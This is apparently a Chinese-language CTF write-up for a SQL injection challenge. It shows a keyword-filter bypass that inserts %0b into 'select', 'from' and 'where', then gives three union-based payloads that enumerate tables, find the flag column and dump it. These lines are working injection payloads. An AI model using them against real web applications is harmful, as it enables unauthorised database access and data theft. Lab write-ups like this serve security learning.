简单的sql注入

尝试一下发现过滤了select等关键词

但可以通过插入%0b来绕过过滤

设置id=-1 通过union select 来回显

```sql
?id=-1 union sel%0bect 1,2,group_concat(table_name) fr%0bom information_schema.tables得到两张表flag，news
?id=-1 union sel%0bect 1,2,group_concat(column_name) fr%0bom information_schema.columns w%0bhere table_name=0x666c6167# 得到列名flag
?id=-1 union sel%0bect 1,2,group_concat(flag,0x3a) fr%0bom flag
```
